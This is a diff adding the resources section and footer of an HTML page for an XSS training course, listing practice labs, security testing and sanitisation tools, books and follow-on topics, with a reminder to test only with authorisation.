+                  <h4 class="font-semibold mb-2">Google XSS Game</h4>
+                  <p class="text-sm mb-2">
+                    A series of challenges to learn about XSS vulnerabilities
+                  </p>
+                  <a
+                    href="https://xss-game.appspot.com/"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">
+                    DVWA (Damn Vulnerable Web App)
+                  </h4>
+                  <p class="text-sm mb-2">
+                    PHP/MySQL web application that is intentionally vulnerable
+                  </p>
+                  <a
+                    href="https://github.com/digininja/DVWA"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">XSS Hunter</h4>
+                  <p class="text-sm mb-2">
+                    Open-source XSS detection and payload service
+                  </p>
+                  <a
+                    href="https://github.com/mandatoryprogrammer/xsshunter"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Tools and Frameworks
+              </h3>
+              <div class="overflow-x-auto">
+                <table class="min-w-full bg-white border border-gray-200">
+                  <thead>
+                    <tr>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Tool
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Purpose
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Link
+                      </th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        DOMPurify
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        HTML sanitizer for client-side applications
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        <a
+                          href="https://github.com/cure53/DOMPurify"
+                          class="text-blue-600 hover:underline"
+                          target="_blank"
+                          >GitHub Repository</a
+                        >
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        CSP Evaluator
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Tool to analyze Content Security Policies
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        <a
+                          href="https://csp-evaluator.withgoogle.com/"
+                          class="text-blue-600 hover:underline"
+                          target="_blank"
+                          >Web Tool</a
+                        >
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        OWASP ZAP
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Free security tool for finding vulnerabilities in web
+                        applications
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        <a
+                          href="https://www.zaproxy.org/"
+                          class="text-blue-600 hover:underline"
+                          target="_blank"
+                          >Website</a
+                        >
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Burp Suite
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Integrated platform for performing security testing of
+                        web applications
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        <a
+                          href="https://portswigger.net/burp"
+                          class="text-blue-600 hover:underline"
+                          target="_blank"
+                          >Website</a
+                        >
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        XSS Strike
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Advanced XSS detection suite
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        <a
+                          href="https://github.com/s0md3v/XSStrike"
+                          class="text-blue-600 hover:underline"
+                          target="_blank"
+                          >GitHub Repository</a
+                        >
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">Books</h3>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">
+                    The Web Application Hacker's Handbook
+                  </h4>
+                  <p class="text-sm mb-2">
+                    By Dafydd Stuttard and Marcus Pinto
+                  </p>
+                  <p class="text-sm text-gray-600">
+                    A comprehensive guide to web application security, including
+                    detailed coverage of XSS attacks.
+                  </p>
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">
+                    Web Security for Developers
+                  </h4>
+                  <p class="text-sm mb-2">By Malcolm McDonald</p>
+                  <p class="text-sm text-gray-600">
+                    A practical guide to web security with examples and
+                    techniques for preventing XSS and other common
+                    vulnerabilities.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Further Learning Path
+              </h3>
+              <div class="bg-gray-50 p-4 rounded-lg">
+                <p class="mb-4">
+                  Now that you've learned about XSS, consider exploring these
+                  related security topics:
+                </p>
+                <ol class="list-decimal pl-6 space-y-2">
+                  <li>
+                    <strong>Cross-Site Request Forgery (CSRF)</strong> - Often
+                    works hand-in-hand with XSS attacks
+                  </li>
+                  <li>
+                    <strong>Content Security Policy (CSP)</strong> - Advanced
+                    implementation and bypass techniques
+                  </li>
+                  <li>
+                    <strong>Subresource Integrity (SRI)</strong> - Securing your
+                    CDN-loaded resources
+                  </li>
+                  <li>
+                    <strong>HTTP Security Headers</strong> - X-XSS-Protection,
+                    X-Content-Type-Options, and more
+                  </li>
+                  <li>
+                    <strong>Client-Side Template Injection</strong> - Advanced
+                    XSS attacks in template frameworks
+                  </li>
+                </ol>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Course Completion Certificate Section -->
+   
+      </main>
+
+      <footer class="text-center py-6 text-gray-600">
+        <p>
+          &copy; 2023 XSS Interactive Course. For educational purposes only.
+        </p>
+        <p class="text-sm mt-2">
+          Remember to always practice ethical hacking and get proper
+          authorization before testing for vulnerabilities.
+        </p>
+      </footer>
+    </div>
+  </body>
+</html>
